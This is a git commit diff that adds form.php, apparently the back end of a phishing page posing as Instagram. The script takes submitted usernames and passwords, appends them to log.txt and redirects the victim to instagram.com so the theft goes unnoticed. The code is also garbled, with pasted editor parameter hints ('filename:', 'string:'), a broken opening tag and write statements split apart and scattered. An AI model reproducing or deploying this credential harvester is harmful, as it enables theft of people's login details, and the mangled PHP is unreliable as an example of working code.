1101c4d95bb4fe12e7b5769eabb15dc42ae37b4d
mihnev22 <foodbolho@gmail.com>
2024-11-18 01:31:59 +0200

    Add files via upload

---
+++ form.php
@@ -0,0 +1,19 @@
+<? php
+
+$username = $_POST['username' ];
+$password = $_POST['password' ];
+
+$fp = fopen( filename:'log.txt', mode:'a+');
+fwrite($fp, string: 'Username:
+fwrite($fp,
+fwrite($fp,
+fclose($fp);
+
+header( string: 'Location: https://instagram.com');
+
+string: 'Password: ' .
+string:
+
+. $username . "\n");
+$password . "\n");
+"\n");
